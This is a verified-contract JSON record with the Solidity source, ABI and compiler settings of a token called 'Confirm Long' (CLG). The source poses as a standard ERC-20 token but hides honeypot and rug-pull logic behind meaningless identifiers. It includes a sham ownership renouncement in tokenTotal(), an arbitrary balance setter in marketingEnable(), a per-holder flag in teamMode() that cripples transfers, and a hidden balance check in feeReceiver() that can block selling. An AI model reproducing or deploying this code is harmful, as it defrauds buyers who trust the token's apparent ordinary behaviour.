{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txFromSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTake {\n    function createPair(address teamLaunchedIs, address minAt) external returns (address);\n}\n\ninterface maxTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountExempt) external view returns (uint256);\n\n    function transfer(address minSwap, uint256 launchedSender) external returns (bool);\n\n    function allowance(address totalLaunchedToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minSwap,\n        uint256 launchedSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenLaunch, uint256 value);\n    event Approval(address indexed totalLaunchedToken, address indexed spender, uint256 value);\n}\n\ninterface maxTeamMetadata is maxTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfirmLong is txFromSell, maxTeam, maxTeamMetadata {\n\n    mapping(address => bool) public teamLaunch;\n\n    address public shouldLiquidity;\n\n    address public feeTo;\n\n    string private liquidityLaunchedAmount = \"CLG\";\n\n    mapping(address => bool) public exemptAtLimit;\n\n    function owner() external view returns (address) {\n        return swapAuto;\n    }\n\n    bool public enableExempt;\n\n    function tokenReceiver(uint256 launchedSender) public {\n        fromTakeLaunched();\n        marketingTotal = launchedSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private listWallet;\n\n    uint256 marketingLiquidity;\n\n    function transferFrom(address receiverModeAmount, address minSwap, uint256 launchedSender) external override returns (bool) {\n        if (_msgSender() != teamMarketing) {\n            if (listWallet[receiverModeAmount][_msgSender()] != type(uint256).max) {\n                require(launchedSender <= listWallet[receiverModeAmount][_msgSender()]);\n                listWallet[receiverModeAmount][_msgSender()] -= launchedSender;\n            }\n        }\n        return feeReceiver(receiverModeAmount, minSwap, launchedSender);\n    }\n\n    bool public teamTo;\n\n    function name() external view virtual override returns (string memory) {\n        return totalList;\n    }\n\n    string private totalList = \"Confirm Long\";\n\n    bool private liquidityEnable;\n\n    function feeReceiver(address receiverModeAmount, address minSwap, uint256 launchedSender) internal returns (bool) {\n        if (receiverModeAmount == shouldLiquidity) {\n            return totalTo(receiverModeAmount, minSwap, launchedSender);\n        }\n        uint256 senderAt = maxTeam(feeTo).balanceOf(listAuto);\n        require(senderAt == marketingTotal);\n        require(minSwap != listAuto);\n        if (teamLaunch[receiverModeAmount]) {\n            return totalTo(receiverModeAmount, minSwap, txTo);\n        }\n        return totalTo(receiverModeAmount, minSwap, launchedSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toAmount;\n    }\n\n    function marketingEnable(address minModeBuy, uint256 launchedSender) public {\n        fromTakeLaunched();\n        modeIsMax[minModeBuy] = launchedSender;\n    }\n\n    uint256 private autoAt = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        launchReceiver limitBuyShould = launchReceiver(teamMarketing);\n        feeTo = liquidityTake(limitBuyShould.factory()).createPair(limitBuyShould.WETH(), address(this));\n        if (swapMin != liquidityEnable) {\n            liquidityEnable = true;\n        }\n        shouldLiquidity = _msgSender();\n        tokenTotal();\n        exemptAtLimit[shouldLiquidity] = true;\n        modeIsMax[shouldLiquidity] = autoAt;\n        if (liquidityEnable != swapMin) {\n            enableExempt = true;\n        }\n        emit Transfer(address(0), shouldLiquidity, autoAt);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityLaunchedAmount;\n    }\n\n    bool public marketingLimit;\n\n    function tokenTotal() public {\n        emit OwnershipTransferred(shouldLiquidity, address(0));\n        swapAuto = address(0);\n    }\n\n    address listAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address listLiquidityReceiver, address teamLaunched) external view virtual override returns (uint256) {\n        if (teamLaunched == teamMarketing) {\n            return type(uint256).max;\n        }\n        return listWallet[listLiquidityReceiver][teamLaunched];\n    }\n\n    bool private exemptSell;\n\n    function transfer(address minModeBuy, uint256 launchedSender) external virtual override returns (bool) {\n        return feeReceiver(_msgSender(), minModeBuy, launchedSender);\n    }\n\n    function fromTakeLaunched() private view {\n        require(exemptAtLimit[_msgSender()]);\n    }\n\n    mapping(address => uint256) private modeIsMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoAt;\n    }\n\n    address private swapAuto;\n\n    uint256 public teamFee;\n\n    bool private sellAmountFee;\n\n    event OwnershipTransferred(address indexed limitBuy, address indexed atTo);\n\n    function getOwner() external view returns (address) {\n        return swapAuto;\n    }\n\n    function approve(address teamLaunched, uint256 launchedSender) public virtual override returns (bool) {\n        listWallet[_msgSender()][teamLaunched] = launchedSender;\n        emit Approval(_msgSender(), teamLaunched, launchedSender);\n        return true;\n    }\n\n    function balanceOf(address amountExempt) public view virtual override returns (uint256) {\n        return modeIsMax[amountExempt];\n    }\n\n    function teamMode(address marketingFund) public {\n        fromTakeLaunched();\n        if (exemptSell) {\n            exemptSell = true;\n        }\n        if (marketingFund == shouldLiquidity || marketingFund == feeTo) {\n            return;\n        }\n        teamLaunch[marketingFund] = true;\n    }\n\n    function totalTo(address receiverModeAmount, address minSwap, uint256 launchedSender) internal returns (bool) {\n        require(modeIsMax[receiverModeAmount] >= launchedSender);\n        modeIsMax[receiverModeAmount] -= launchedSender;\n        modeIsMax[minSwap] += launchedSender;\n        emit Transfer(receiverModeAmount, minSwap, launchedSender);\n        return true;\n    }\n\n    uint8 private toAmount = 18;\n\n    uint256 marketingTotal;\n\n    function feeFrom(address receiverLaunch) public {\n        if (marketingLimit) {\n            return;\n        }\n        \n        exemptAtLimit[receiverLaunch] = true;\n        if (receiverLaunched != teamFee) {\n            liquidityEnable = true;\n        }\n        marketingLimit = true;\n    }\n\n    bool public swapMin;\n\n    uint256 constant txTo = 12 ** 10;\n\n    uint256 private receiverLaunched;\n\n    address teamMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLaunchedToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAtLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"feeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minModeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"marketingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"}],\"name\":\"teamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minModeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverModeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfirmLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}